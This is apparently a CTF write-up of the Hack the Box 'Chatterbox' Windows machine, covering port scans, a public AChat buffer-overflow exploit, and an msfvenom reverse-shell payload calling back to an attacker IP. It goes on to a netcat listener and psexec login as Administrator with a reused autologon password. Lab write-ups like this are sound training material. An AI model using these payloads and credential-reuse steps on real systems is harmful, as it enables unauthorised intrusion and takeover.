---
title: Hack the Box - Chatterbox
date: 2022-10-06 12:00:00 -500 
categories: [Hack the Box]
tags: [oscp,windows]
---

![Chatterbox](/assets/HackTheBox/Chatterbox/Chatterbox.png)

# Bounty Overview

## Machine Details

|IP|Hostname|Operating System|
|---|---|---|
|10.10.10.74|Chatterbox|Windows|

## Path to Exploitation

To complete Chatterbox we'll start by leveraging a buffer overflow vulnerability in an outdated chat server with a publicly available exploit. Once we modify the payload in the script we'll get a reverse shell back on our machine. To escalate our privileges, we'll reuse a weak password that we were able to identify and gain access to the administrator account. 

# Chatterbox Enumeration

## Full Port Scan

```shell
$ nmap 10.10.10.74 -p- -oA Chatterbox/nmap/full-port --open -Pn -vv
```

Which Resulted In:

|PORT|SERVICE|
|----|-------|
|9255|mon|
|9256|unknown|
|49152|unknown|
|49153|unknown|
|49154|unknown|
|49155|unknown|
|49156|unknown|
|49157|unknown|

## Service Scan

```shell
$ nmap 10.10.10.74 -p 9255,9256,49152,49153,49154,49155,49156,49157 -sC -sV -oA Chatterbox/nmap/service-scan -Pn
```

Which Resulting In:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|9255|http|chat system httpd|
|9256|achat|chat system|
|49152|msrpc|Windows RPC|
|49153|msrpc|Windows RPC|
|49154|msrpc|Windows RPC|
|49155|msrpc|Windows RPC|
|49156|msrpc|Windows RPC|
|49157|msrpc|Windows RPC|

# Exploiting the AChat Server

I did a simple google search of this AChat service and found a potential exploit that I could use. The [exploit](https://www.exploit-db.com/exploits/36025) is a remote buffer overflow.

Inside the script we see the command needed to generate the payload

```shell
$ msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We'll need to modify this command to create a reverse shell payload instead of executing calc.exe

```shell
$ msfvenom -p windows/shell_reverse_tcp -a x86 --platform Windows LHOST=10.10.14.8 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

After creating this payload and modifying the script with it, we can setup a nc listener and launch the exploit

```shell
$ python exploit.py
```

Checking back on the listener we see we have a shell as alfred

![Initial Foothold](/assets/HackTheBox/Chatterbox/initial-foothold.png)

# Privilege Escalation

Running winpeas we identify a set of Autologon credentials

![Credentials](/assets/HackTheBox/Chatterbox/autologon-creds.png)

We can try re-using this password with the administrator account using PsExec

```shell
$ python /home/pharo/.local/bin/psexec.py Administrator:"Welcome1\!"@10.10.10.74
```

![Privilege Escalation](/assets/HackTheBox/Chatterbox/priv-esc.png)

We can see that we now have a session running as SYSTEM.